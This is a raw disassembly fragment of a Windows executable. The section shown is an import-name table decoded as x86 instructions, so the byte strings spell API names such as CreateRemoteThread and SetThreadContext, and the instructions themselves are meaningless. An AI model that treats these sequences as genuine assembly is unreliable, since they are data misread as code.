  41317b:	outs   dx,BYTE PTR ds:[esi]
  41317c:	push   0x6c646e61
  413181:	gs fs inc ebp
  413184:	js     0x4131e9
  413186:	gs jo  0x4131fd
  413189:	imul   ebp,DWORD PTR [edi+0x6e],0x746c6946
  413190:	gs jb  0x413193
  413193:	add    BYTE PTR [ecx+0x72695604],al
  413199:	je     0x413210
  41319b:	popa   
  41319c:	ins    BYTE PTR es:[edi],dx
  41319d:	inc    esi
  41319e:	jb     0x413205
  4131a0:	add    BYTE PTR gs:[edi+0x74654701],bl
  4131a7:	inc    ebx
  4131a8:	outs   dx,DWORD PTR ds:[esi]
  4131a9:	ins    DWORD PTR es:[edi],dx
  4131aa:	jo     0x413221
  4131ac:	je     0x413213
  4131ae:	jb     0x4131fe
  4131b0:	popa   
  4131b1:	ins    DWORD PTR es:[edi],dx
  4131b2:	gs inc ecx
  4131b4:	add    BYTE PTR [eax],al
  4131b6:	int    0x0
  4131b8:	inc    ebx
  4131b9:	jb     0x413220
  4131bb:	popa   
  4131bc:	je     0x413223
  4131be:	inc    ebp
  4131bf:	jbe    0x413226
  4131c1:	outs   dx,BYTE PTR ds:[esi]
  4131c2:	je     0x41321b
  4131c4:	add    BYTE PTR [eax],al
  4131c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c7:	add    BYTE PTR [ebx+0x61],al
  4131ca:	outs   dx,BYTE PTR ds:[esi]
  4131cb:	arpl   WORD PTR [ebp+0x6c],sp
  4131ce:	dec    ecx
  4131cf:	outs   dx,DWORD PTR ds:[esi]
  4131d0:	add    BYTE PTR [eax],al
  4131d2:	outs   dx,DWORD PTR ds:[esi]
  4131d3:	add    al,0x55
  4131d5:	outs   dx,BYTE PTR ds:[esi]
  4131d6:	ins    DWORD PTR es:[edi],dx
  4131d7:	popa   
  4131d8:	jo     0x413230
  4131da:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  4131e1:	ins    BYTE PTR es:[edi],dx
  4131e2:	add    BYTE PTR gs:[ebp+0x4],cl
  4131e6:	push   ebx
  4131e7:	ins    BYTE PTR es:[edi],dx
  4131e8:	gs gs jo 0x4131ec
  4131ec:	sti    
  4131ed:	add    DWORD PTR [edi+0x65],eax
  4131f0:	je     0x41323e
  4131f2:	popa   
  4131f3:	jae    0x413269
  4131f5:	inc    ebp
  4131f6:	jb     0x41326a
  4131f8:	outs   dx,DWORD PTR ds:[esi]
  4131f9:	jb     0x4131fb
  4131fb:	add    BYTE PTR [ecx],ch
  4131fd:	add    al,BYTE PTR [edi+0x65]
  413200:	je     0x413252
  413202:	jb     0x413273
  413204:	arpl   WORD PTR [ecx+0x64],ax
  413207:	fs jb  0x41326f
  41320a:	jae    0x41327f
  41320c:	add    BYTE PTR [eax],al
  41320e:	add    BYTE PTR [ecx],0x46
  413211:	jb     0x413278
  413213:	gs dec esp
  413215:	imul   esp,DWORD PTR [edx+0x72],0x797261
  41321c:	rol    BYTE PTR [ecx],1
  41321e:	inc    edi
  41321f:	gs je  0x413266
  413222:	popa   
  413223:	je     0x41328a
  413225:	inc    esi
  413226:	outs   dx,DWORD PTR ds:[esi]
  413227:	jb     0x413296
  413229:	popa   
  41322a:	je     0x41326d
  41322c:	add    BYTE PTR [eax],al
  41322e:	outs   dx,DWORD PTR ds:[esi]
  41322f:	add    al,BYTE PTR [edi+0x65]
  413232:	je     0x413288
  413234:	imul   ebp,DWORD PTR [ebp+0x65],0x6d726f46
  41323b:	popa   
  41323c:	je     0x41327f
  41323e:	add    BYTE PTR [eax],al
  413240:	jge    0x413246
  413242:	push   esi
  413243:	gs jb  0x4132af
  413246:	data16 jns 0x41329f
  413249:	gs jb  0x4132bf
  41324c:	imul   ebp,DWORD PTR [edi+0x6e],0x6f666e49
  413253:	push   edi
  413254:	add    BYTE PTR [eax],al
  413256:	xchg   edi,eax
  413257:	add    al,BYTE PTR [edi+0x6c]
  41325a:	outs   dx,DWORD PTR ds:[esi]
  41325b:	bound  esp,QWORD PTR [ecx+0x6c]
  41325e:	push   edx
  41325f:	gs inc ecx
  413261:	ins    BYTE PTR es:[edi],dx
  413262:	ins    BYTE PTR es:[edi],dx
  413263:	outs   dx,DWORD PTR ds:[esi]
  413264:	arpl   WORD PTR [eax],ax
  413266:	fild   DWORD PTR [eax]
  413268:	inc    ebx
  413269:	jb     0x4132d0
  41326b:	popa   
  41326c:	je     0x4132d3
  41326e:	dec    ebp
  41326f:	popa   
  413270:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x57746f
  413278:	in     al,0x3
  41327a:	push   ebx
  41327b:	gs je  0x4132c1
  41327e:	outs   dx,DWORD PTR ds:[esi]
  41327f:	ins    DWORD PTR es:[edi],dx
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	push   esp
  413282:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  413289:	add    BYTE PTR [edx+eax*1+0x47],dl
  41328d:	gs je  0x4132e3
  413290:	jns    0x413305
  413292:	je     0x4132f9
  413294:	ins    DWORD PTR es:[edi],dx
  413295:	push   esp
  413296:	imul   ebp,DWORD PTR [ebp+0x65],0x47025000
  41329d:	gs je  0x4132f3
  4132a0:	jns    0x413315
  4132a2:	je     0x413309
  4132a4:	ins    DWORD PTR es:[edi],dx
  4132a5:	inc    esp
  4132a6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4132ad:	jns    0x413306
  4132af:	add    bl,cl
  4132b1:	add    cl,BYTE PTR [ecx+0x73]
  4132b4:	inc    edx
  4132b5:	popa   
  4132b6:	fs push edx
  4132b8:	gs popa 
  4132ba:	fs push eax
  4132bc:	je     0x413330
  4132be:	add    BYTE PTR [eax],al
  4132c0:	mov    eax,ds:0x61654802
  4132c5:	jo     0x413308
  4132c7:	ins    BYTE PTR es:[edi],dx
  4132c8:	ins    BYTE PTR es:[edi],dx
  4132c9:	outs   dx,DWORD PTR ds:[esi]
  4132ca:	arpl   WORD PTR [eax],ax
  4132cc:	and    al,BYTE PTR [ecx]
  4132ce:	inc    ebp
  4132cf:	outs   dx,BYTE PTR ds:[esi]
  4132d0:	jne    0x41333f
  4132d2:	push   edx
  4132d3:	gs jae 0x413345
  4132d6:	jne    0x41334a
  4132d8:	arpl   WORD PTR [ebp+0x54],sp
  4132db:	jns    0x41334d
  4132dd:	gs jae 0x413321
  4132e0:	add    BYTE PTR [eax],al
  4132e2:	push   es
  4132e3:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  4132e7:	fs dec esp
  4132e9:	imul   esp,DWORD PTR [edx+0x72],0x45797261
  4132f0:	js     0x413333
  4132f2:	add    BYTE PTR [eax],al
  4132f4:	mov    bl,0x0
  4132f6:	inc    ebx
  4132f7:	outs   dx,DWORD PTR ds:[esi]
  4132f8:	ins    DWORD PTR es:[edi],dx
  4132f9:	jo     0x41335c
  4132fb:	jb     0x413362
  4132fd:	push   ebx
  4132fe:	je     0x413372
  413300:	imul   ebp,DWORD PTR [esi+0x67],0x12000041
  413307:	add    al,0x53
  413309:	gs je  0x413351
  41330c:	jb     0x413380
  41330e:	outs   dx,DWORD PTR ds:[esi]
  41330f:	jb     0x41335e
  413311:	outs   dx,DWORD PTR ds:[esi]
  413312:	fs add BYTE PTR gs:[eax],al
  413316:	out    0x0,al
  413318:	inc    ebx
  413319:	jb     0x413380
  41331b:	popa   
  41331c:	je     0x413383
  41331e:	push   edx
  41331f:	gs ins DWORD PTR es:[edi],dx
  413321:	outs   dx,DWORD PTR ds:[esi]
  413322:	je     0x413389
  413324:	push   esp
  413325:	push   0x64616572
  41332a:	add    BYTE PTR [eax],al
  41332c:	pop    DWORD PTR [edx]
  41332e:	inc    edi
  41332f:	ins    BYTE PTR es:[edi],dx
  413330:	outs   dx,DWORD PTR ds:[esi]
  413331:	bound  esp,QWORD PTR [ecx+0x6c]
  413334:	inc    esi
  413335:	ins    BYTE PTR es:[edi],dx
  413336:	popa   
  413337:	addr16 jae 0x41333a
  41333a:	mov    es,WORD PTR [edi+edx*2]
  41333d:	popa   
  41333e:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x6e695372
  413346:	ins    BYTE PTR es:[di],dx
  413348:	gs dec edi
  41334a:	bound  ebp,QWORD PTR [edx+0x65]
  41334d:	arpl   WORD PTR [eax+eax*1+0x18],si
  413351:	add    al,BYTE PTR [edi+0x65]
  413354:	je     0x4133a4
  413356:	jne    0x4133c5
  413358:	bound  esp,QWORD PTR [ebp+0x72]
  41335b:	inc    esi
  41335c:	outs   dx,DWORD PTR ds:[esi]
  41335d:	jb     0x4133cc
  41335f:	popa   
  413360:	je     0x4133b9
  413362:	add    BYTE PTR [eax],al
  413364:	xchg   ebx,eax
  413365:	add    al,0x57
  413367:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x54726168
  41336f:	outs   dx,DWORD PTR ds:[esi]
  413370:	dec    ebp
  413371:	jne    0x4133df
  413373:	je     0x4133de
  413375:	inc    edx
  413376:	jns    0x4133ec
  413378:	add    BYTE PTR gs:[ebp+0x2],cl
  41337c:	inc    edi
  41337d:	gs je  0x4133d3
  413380:	jns    0x4133f5
  413382:	je     0x4133e9
  413384:	ins    DWORD PTR es:[edi],dx
  413385:	inc    esp
  413386:	gs popaw 
  413389:	jne    0x4133f7
  41338b:	je     0x4133e2
  41338d:	dec    ecx
  41338e:	dec    esp
  41338f:	popa   
  413390:	outs   dx,BYTE PTR ds:[esi]
  413391:	addr16 jne 0x4133f5
  413394:	add    BYTE PTR gs:[bx+si],al
  413398:	test   DWORD PTR [edx],eax
  41339a:	inc    edi
  41339b:	gs je  0x4133f5
  41339e:	imul   ebp,DWORD PTR [esi+0x64],0x4473776f
  4133a5:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4133ac:	jns    0x413405
  4133ae:	add    BYTE PTR [eax],al
  4133b0:	jl     0x4133b2
  4133b2:	inc    ecx
  4133b3:	fs fs inc ecx
  4133b6:	je     0x413427
  4133b8:	ins    DWORD PTR es:[edi],dx
  4133b9:	inc    ecx
  4133ba:	add    BYTE PTR [eax],al
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	add    BYTE PTR [ebx+0x6c],al
  4133c0:	gs popa 
  4133c2:	jb     0x413407
  4133c4:	outs   dx,DWORD PTR ds:[esi]
  4133c5:	ins    DWORD PTR es:[edi],dx
  4133c6:	ins    DWORD PTR es:[edi],dx
  4133c7:	inc    ebp
  4133c8:	jb     0x41343c
  4133ca:	outs   dx,DWORD PTR ds:[esi]
  4133cb:	jb     0x4133cd
  4133cd:	add    ch,al
  4133cf:	add    al,0x6c
  4133d1:	jae    0x413447
  4133d3:	jb     0x413438
  4133d5:	ins    DWORD PTR es:[edi],dx
  4133d6:	jo     0x413441
  4133d8:	inc    ecx
  4133d9:	add    BYTE PTR [esi],dh
  4133db:	add    al,0x53
  4133dd:	gs je  0x413434
  4133e0:	push   0x64616572
  4133e5:	inc    ebx
  4133e6:	outs   dx,DWORD PTR ds:[esi]
  4133e7:	outs   dx,BYTE PTR ds:[esi]
  4133e8:	je     0x41344f
  4133ea:	js     0x413460
  4133ec:	add    BYTE PTR [eax],al
  4133ee:	repnz add BYTE PTR [ebx+0x72],al
  4133f2:	gs popa 
  4133f4:	je     0x41345b
  4133f6:	push   edi
  4133f7:	popa   
  4133f8:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  413400:	ins    DWORD PTR es:[edi],dx
  413401:	gs jb  0x413445
  413404:	add    BYTE PTR [eax],al
  413406:	mov    BYTE PTR [esp+ebp*2],0x73
  41340a:	je     0x41347e
  41340c:	arpl   WORD PTR [ebp+0x70],bp
  41340f:	imul   edx,DWORD PTR [edi+0x0],0x724300d3
  413416:	gs popa 
  413418:	je     0x41347f
  41341a:	inc    esi
  41341b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x53044c00
  413423:	imul   edi,DWORD PTR [edx+0x65],0x6552666f
  41342a:	jae    0x41349b
  41342c:	jne    0x4134a0
  41342e:	arpl   WORD PTR [ebp+0x0],sp
  413431:	add    BYTE PTR [eax],cl
  413433:	add    ecx,DWORD PTR [edi+ebp*2+0x61]
  413437:	fs dec esp
  413439:	imul   esp,DWORD PTR [edx+0x72],0x57797261
  413440:	add    BYTE PTR [eax],al
  413442:	mov    al,BYTE PTR [ecx]
  413444:	inc    edi
  413445:	gs je  0x413489
  413448:	inc    ebx
  413449:	push   eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	pop    ss
  41344d:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  413451:	imul   eax,DWORD PTR [esi+0x69],0x6c
  413455:	add    BYTE PTR gs:[eax],al
  413458:	dec    ebx
  413459:	inc    ebp
  41345a:	push   edx
  41345b:	dec    esi
  41345c:	inc    ebp
  41345d:	dec    esp
  41345e:	xor    esi,DWORD PTR [edx]
  413460:	cs fs ins BYTE PTR es:[edi],dx
  413463:	ins    BYTE PTR es:[edi],dx
  413464:	add    BYTE PTR [eax],al
  413466:	add    al,0x0
  413468:	inc    ebx
  413469:	push   0x65736f6f
  41346e:	inc    esi
  41346f:	outs   dx,DWORD PTR ds:[esi]
  413470:	outs   dx,BYTE PTR ds:[esi]
  413471:	je     0x4134ca
  413473:	add    BYTE PTR [edi],dl
  413475:	add    BYTE PTR [eax+0x72],dl
  413478:	imul   ebp,DWORD PTR [esi+0x74],0x57676c44
  41347f:	add    BYTE PTR [esi],cl
  413481:	add    BYTE PTR [edi+0x65],al
  413484:	je     0x4134d5
  413486:	jo     0x4134ed
  413488:	outs   dx,BYTE PTR ds:[esi]
  413489:	inc    esi
  41348a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  413492:	add    BYTE PTR [eax],al
  413494:	or     al,BYTE PTR [eax]
  413496:	inc    esi
  413497:	imul   ebp,DWORD PTR [esi+0x64],0x74786554
  41349e:	push   edi
  41349f:	add    BYTE PTR [ebx+0x6f],ah
  4134a2:	ins    DWORD PTR es:[edi],dx
  4134a3:	fs ins BYTE PTR es:[edi],dx
  4134a5:	xor    esi,DWORD PTR [bp+si]
  4134a8:	cs fs ins BYTE PTR es:[edi],dx
  4134ab:	ins    BYTE PTR es:[edi],dx
  4134ac:	add    BYTE PTR [eax],al
  4134ae:	cmc    
  4134af:	add    BYTE PTR [edi+0x63],bl
  4134b2:	outs   dx,DWORD PTR ds:[esi]
  4134b3:	outs   dx,BYTE PTR ds:[esi]
  4134b4:	je     0x413528
  4134b6:	outs   dx,DWORD PTR ds:[esi]
  4134b7:	ins    BYTE PTR es:[edi],dx
  4134b8:	data16 jo 0x4134bb
  4134bb:	add    BYTE PTR [ebx+0x735f5f00],dh
  4134c1:	gs je  0x413523
  4134c4:	popa   
  4134c5:	jo     0x413537
  4134c7:	pop    edi
  4134c8:	je     0x413543
  4134ca:	jo     0x413531
  4134cc:	add    BYTE PTR [eax],al
  4134ce:	mov    al,ds:0x705f5f00
  4134d3:	pop    edi
  4134d4:	pop    edi
  4134d5:	ins    WORD PTR es:[edi],dx
  4134d7:	outs   dx,DWORD PTR ds:[esi]
  4134d8:	fs add BYTE PTR gs:[eax],al
  4134dc:	ins    DWORD PTR es:[edi],dx
  4134dd:	add    esp,DWORD PTR [esi+0x67]
  4134e0:	gs je  0x413546
  4134e3:	add    BYTE PTR [ebx+0x705f5f00],bl
  4134e9:	pop    edi
  4134ea:	pop    edi
  4134eb:	arpl   WORD PTR [edi+0x6d],bp
  4134ee:	ins    DWORD PTR es:[edi],dx
  4134ef:	outs   dx,DWORD PTR ds:[esi]
  4134f0:	fs add BYTE PTR gs:[eax],al
  4134f4:	mov    bh,0x3
  4134f6:	ins    DWORD PTR es:[edi],dx
  4134f7:	bound  esi,QWORD PTR [ebx+0x74]
  4134fa:	outs   dx,DWORD PTR ds:[esi]
  4134fb:	ja     0x413560
  4134fd:	jae    0x4134ff
  4134ff:	add    bl,bl
  413501:	add    BYTE PTR [edi+0x61],bl
  413504:	ins    DWORD PTR es:[edi],dx
  413505:	jae    0x41356e
  413507:	pop    edi
  413508:	gs js  0x413574
  41350b:	je     0x41350d
  41350d:	add    BYTE PTR [ebx+0x65736603],al
  413513:	imul   eax,DWORD PTR gs:[eax],0xffffff86
  413517:	add    DWORD PTR [edi+0x69],ebx
  41351a:	outs   dx,BYTE PTR ds:[esi]
  41351b:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x33006d72
  413523:	add    al,0x77
  413525:	arpl   WORD PTR [ebx+0x74],si
  413528:	outs   dx,DWORD PTR ds:[esi]
  413529:	imul   eax,DWORD PTR [eax],0x0
  41352c:	xchg   esp,eax
  41352d:	add    ebp,DWORD PTR [ecx+0x73]
  413530:	popa   
  413531:	ins    BYTE PTR es:[edi],dx
  413532:	outs   dx,BYTE PTR ds:[esi]
  413533:	jne    0x4135a2
  413535:	add    BYTE PTR [esi],al
  413537:	add    al,0x74
  413539:	imul   ebp,DWORD PTR [ebp+0x65],0x41c0000
  413540:	ja     0x4135a5
  413542:	jae    0x4135a7
  413544:	popa   
  413545:	je     0x413547
  413547:	add    al,ch
  413549:	add    esi,DWORD PTR [ebx+0x74]
  41354c:	jb     0x4135b1
  41354e:	jo     0x4135c9
  413550:	add    BYTE PTR [eax],al
  413552:	out    0x3,eax
  413554:	jae    0x4135ca
  413556:	jb     0x4135bb
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	ins    BYTE PTR es:[edi],dx
  41355a:	ins    BYTE PTR es:[edi],dx
  41355b:	add    BYTE PTR [esi],dh
  41355d:	add    al,0x77
  41355f:	arpl   WORD PTR [ebx+0x74],si
  413562:	outs   dx,DWORD PTR ds:[esi]
  413563:	ins    DWORD PTR es:[edi],dx
  413564:	bound  esi,QWORD PTR [ebx+0x0]
  413567:	add    BYTE PTR [edi+0x3],bl
  41356a:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  41356e:	jb     0x4135d5
  413570:	jb     0x4135e4
  413572:	add    BYTE PTR [eax],al
  413574:	jmp    0x7363:0x72747303
  41357b:	jo     0x4135eb
  41357d:	add    ch,ah
  41357f:	add    esi,DWORD PTR [ebx+0x74]
  413582:	jb     0x4135e7
  413584:	push   0x1000072
  413589:	add    al,0x73
  41358b:	ja     0x413600
  41358d:	arpl   WORD PTR [ecx+0x6e],sp
  413590:	data16 add BYTE PTR [esi+0x73695f01],bl
  413597:	ins    DWORD PTR es:[edi],dx
  413598:	bound  esp,QWORD PTR [edx+0x6c]
  41359b:	gs popa 
  41359d:	add    BYTE PTR fs:[eax],al
  4135a0:	int3   
  4135a1:	add    esi,DWORD PTR [ecx+0x73]
  4135a4:	outs   dx,DWORD PTR ds:[esi]
  4135a5:	jb     0x41361b
  4135a7:	add    BYTE PTR [ebx],cl
  4135a9:	add    al,0x74
  4135ab:	outs   dx,DWORD PTR ds:[esi]
  4135ac:	ja     0x41361a
  4135ae:	outs   dx,DWORD PTR ds:[esi]
  4135af:	ja     0x413616
  4135b1:	jb     0x4135b3
  4135b3:	add    BYTE PTR [ebp+0x6c616d03],dh
  4135b9:	ins    BYTE PTR es:[edi],dx
  4135ba:	outs   dx,DWORD PTR ds:[esi]
  4135bb:	arpl   WORD PTR [eax],ax
  4135bd:	add    BYTE PTR [ebx],al
  4135bf:	add    al,0x73
  4135c1:	jns    0x413636
  4135c3:	je     0x41362a
  4135c5:	ins    DWORD PTR es:[edi],dx
  4135c6:	add    BYTE PTR [eax],al
  4135c8:	sub    al,0x4
  4135ca:	ja     0x41362f
  4135cc:	jae    0x41363e
  4135ce:	bound  esi,QWORD PTR [edx+0x6b]
  4135d1:	add    BYTE PTR [eax],bl
  4135d3:	add    al,0x76
  4135d5:	jae    0x41364e
  4135d7:	jo     0x41364b
  4135d9:	imul   ebp,DWORD PTR [esi+0x74],0x520066
  4135e0:	pop    edi
  4135e1:	pop    eax
  4135e2:	arpl   WORD PTR [eax+0x74],si
  4135e5:	inc    esi
  4135e6:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x4160072
  4135ee:	jbe    0x413663
  4135f0:	jo     0x413664
  4135f2:	imul   ebp,DWORD PTR [esi+0x74],0x78000066
  4135f9:	add    esp,DWORD PTR [esi+0x70]
  4135fc:	jne    0x413672
  4135fe:	arpl   WORD PTR [eax],ax
  413600:	mov    cl,0x3
  413602:	ins    BYTE PTR es:[edi],dx
  413603:	outs   dx,DWORD PTR ds:[esi]
  413604:	arpl   WORD PTR [ecx+0x6c],sp
  413607:	je     0x413672
  413609:	ins    DWORD PTR es:[edi],dx
  41360a:	add    BYTE PTR gs:[ebx+eax*1+0x66],ch
  41360f:	data16 ins BYTE PTR es:[edi],dx
  413611:	jne    0x413686
  413613:	push   0x41e0000
  413618:	ja     0x41367d
  41361a:	jae    0x41367f
  41361c:	push   0x23000072
  413621:	add    DWORD PTR [edi+0x65],ebx
  413624:	js     0x41368f
  413626:	je     0x413628
  413628:	pop    ebp
  413629:	add    esp,DWORD PTR [ebx+0x61]
  41362c:	ins    BYTE PTR es:[edi],dx
  41362d:	ins    BYTE PTR es:[edi],dx
  41362e:	outs   dx,DWORD PTR ds:[esi]
  41362f:	arpl   WORD PTR [eax],ax
  413631:	add    cl,bl
  413633:	add    esi,DWORD PTR [ebx+0x65]
  413636:	je     0x4136ae
  413638:	bound  esi,QWORD PTR [ebp+0x66]
  41363b:	add    BYTE PTR [ebx+0x70736903],bl
  413641:	jb     0x4136ac
  413643:	outs   dx,BYTE PTR ds:[esi]
  413644:	je     0x413646
  413646:	or     eax,0x676e7504
  41364b:	gs je  0x4136b1
  41364e:	add    BYTE PTR [eax],al
  413650:	cmp    BYTE PTR [edi+esi*2],al
  413653:	arpl   WORD PTR [ebx+0x74],si
  413656:	outs   dx,DWORD PTR ds:[esi]
  413657:	jne    0x4136c5
  413659:	add    al,ch
  41365b:	add    BYTE PTR [edi+0x63],bl
  41365e:	gs js  0x4136ca
  413661:	je     0x413663
  413663:	add    BYTE PTR [ebx+0x3],bl
  413666:	bound  esi,QWORD PTR [ebx+0x65]
  413669:	popa   
  41366a:	jb     0x4136cf
  41366c:	push   0x5f00b500
  413671:	pop    edi
  413672:	jae    0x4136d9
  413674:	je     0x4136eb
  413676:	jae    0x4136dd
  413678:	jb     0x4136e7
  41367a:	popa   
  41367b:	je     0x4136e5
  41367d:	gs jb  0x4136f2
  413680:	add    BYTE PTR [eax],al
  413682:	jb     0x413684
  413684:	pop    edi
  413685:	pop    edi
  413686:	addr16 gs je 0x4136f7
  41368a:	popa   
  41368b:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  413692:	enter  0x7003,0x75
  413696:	je     0x4136fb
  413698:	push   0x4d007261
  41369d:	push   ebx
  41369e:	push   esi
  41369f:	inc    ebx
  4136a0:	push   edx
  4136a1:	push   esp
  4136a2:	cs fs ins BYTE PTR es:[edi],dx
  4136a5:	ins    BYTE PTR es:[edi],dx
  4136a6:	add    BYTE PTR [eax],al
  4136a8:	push   edi
  4136a9:	add    BYTE PTR [ecx+0x6e],cl
  4136ac:	imul   esi,DWORD PTR [ebx+eax*2+0x6f],0x6e6f6d6d
  4136b4:	inc    ebx
  4136b5:	outs   dx,DWORD PTR ds:[esi]
  4136b6:	outs   dx,BYTE PTR ds:[esi]
  4136b7:	je     0x41372b
  4136b9:	outs   dx,DWORD PTR ds:[esi]
  4136ba:	ins    BYTE PTR es:[edi],dx
  4136bb:	jae    0x413702
  4136bd:	js     0x4136bf
  4136bf:	add    BYTE PTR [ebp+0x0],al
  4136c2:	dec    ecx
  4136c3:	ins    DWORD PTR es:[edi],dx
  4136c4:	popa   
  4136c5:	addr16 gs dec esp
  4136c8:	imul   esi,DWORD PTR [ebx+0x74],0x616f4c5f
  4136cf:	fs dec ecx
  4136d1:	ins    DWORD PTR es:[edi],dx
  4136d2:	popa   
  4136d3:	addr16 gs push edi
  4136d6:	add    BYTE PTR [eax],al
  4136d8:	adc    eax,DWORD PTR [eax]
  4136da:	inc    ebx
  4136db:	jb     0x413742
  4136dd:	popa   
  4136de:	je     0x413745
  4136e0:	push   eax
  4136e1:	jb     0x413752
  4136e3:	jo     0x41374a
  4136e5:	jb     0x41375b
  4136e7:	jns    0x41373c
  4136e9:	push   0x50746565
  4136ee:	popa   
  4136ef:	addr16 gs push edi
  4136f2:	add    BYTE PTR [eax],al
  4136f4:	dec    esi
  4136f5:	add    BYTE PTR [ecx+0x6d],cl
  4136f8:	popa   
  4136f9:	addr16 gs dec esp
  4136fc:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	popa   
  413705:	arpl   WORD PTR [ebp+0x49],sp
  413708:	arpl   WORD PTR [edi+0x6e],bp
  41370b:	add    BYTE PTR [edi],bh
  41370d:	add    BYTE PTR [ecx+0x6d],cl
  413710:	popa   
  413711:	addr16 gs dec esp
  413714:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  41371b:	dec    ecx
  41371c:	arpl   WORD PTR [edi+0x6e],bp
  41371f:	push   ebx
  413720:	imul   edi,DWORD PTR [edx+0x65],0x49003e00
  413727:	ins    DWORD PTR es:[edi],dx
  413728:	popa   
  413729:	addr16 gs dec esp
  41372c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  413733:	dec    ecx
  413734:	arpl   WORD PTR [edi+0x6e],bp
  413737:	add    BYTE PTR [ebx+0x4f],al
  41373a:	dec    ebp
  41373b:	inc    ebx
  41373c:	push   esp
  41373d:	dec    esp
  41373e:	xor    esi,DWORD PTR [edx]
  413740:	cs fs ins BYTE PTR es:[edi],dx
  413743:	ins    BYTE PTR es:[edi],dx
  413744:	add    BYTE PTR [eax],al
  413746:	les    eax,FWORD PTR [eax]
  413748:	inc    ebp
  413749:	outs   dx,BYTE PTR ds:[esi]
  41374a:	jne    0x4137b9
  41374c:	inc    esi
  41374d:	outs   dx,DWORD PTR ds:[esi]
  41374e:	outs   dx,BYTE PTR ds:[esi]
  41374f:	je     0x413797
  413751:	popa   
  413752:	ins    DWORD PTR es:[edi],dx
  413753:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41375b:	add    ah,bl
  41375d:	add    DWORD PTR [ebx+0x65],edx
  413760:	je     0x4137a6
  413762:	dec    ecx
  413763:	inc    edx
  413764:	inc    ebx
  413765:	outs   dx,DWORD PTR ds:[esi]
  413766:	ins    BYTE PTR es:[edi],dx
  413767:	outs   dx,DWORD PTR ds:[esi]
  413768:	jb     0x4137be
  41376a:	popa   
  41376b:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41376f:	add    ch,dl
  413771:	add    BYTE PTR [ebp+0x78],al
  413774:	je     0x4137ca
  413776:	gs js  0x4137ed
  413779:	dec    edi
  41377a:	jne    0x4137f0
  41377c:	push   edi
  41377d:	add    BYTE PTR [edx+0x65724300],ah
  413783:	popa   
  413784:	je     0x4137eb
  413786:	dec    ecx
  413787:	inc    ebx
  413788:	push   edi
  413789:	add    BYTE PTR [ecx+0x6d6f4300],al
  41378f:	bound  ebp,QWORD PTR [ecx+0x6e]
  413792:	gs push edx
  413794:	outs   dx,BYTE PTR ds:[si]
  413796:	add    BYTE PTR [eax],al
  413798:	mov    bl,0x0
  41379a:	inc    esp
  41379b:	gs ins BYTE PTR es:[edi],dx
  41379d:	gs je  0x413805
  4137a0:	inc    esp
  4137a1:	inc    ebx
  4137a2:	add    BYTE PTR [eax],al
  4137a4:	inc    ecx
  4137a5:	add    DWORD PTR [edi+0x65],eax
  4137a8:	je     0x4137ee
  4137aa:	gs jbe 0x413816
  4137ad:	arpl   WORD PTR [ebp+0x43],sp
  4137b0:	popa   
  4137b1:	jo     0x413826
  4137b3:	add    BYTE PTR [ecx],ah
  4137b5:	add    DWORD PTR [edi+0x65],eax
  4137b8:	je     0x4137fc
  4137ba:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  4137c2:	jae    0x4137c4
  4137c4:	mov    DWORD PTR [ecx],0x65766153
  4137ca:	inc    esp
  4137cb:	inc    ebx
  4137cc:	add    BYTE PTR [eax],al
  4137ce:	jne    0x4137d0
  4137d0:	inc    edx
  4137d1:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4137da:	add    DWORD PTR [ecx],0x47
  4137dd:	gs je  0x413834
  4137e0:	gs js  0x413857
  4137e3:	inc    ebp
  4137e4:	js     0x41385a
  4137e6:	outs   dx,BYTE PTR gs:[esi]
  4137e8:	je     0x41383a
  4137ea:	outs   dx,DWORD PTR ds:[esi]
  4137eb:	imul   ebp,DWORD PTR [esi+0x74],0x413233
  4137f2:	stos   BYTE PTR es:[edi],al
  4137f3:	add    BYTE PTR [ebx+0x72],al
  4137f6:	gs popa 
  4137f8:	je     0x41385f
  4137fa:	push   eax
  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
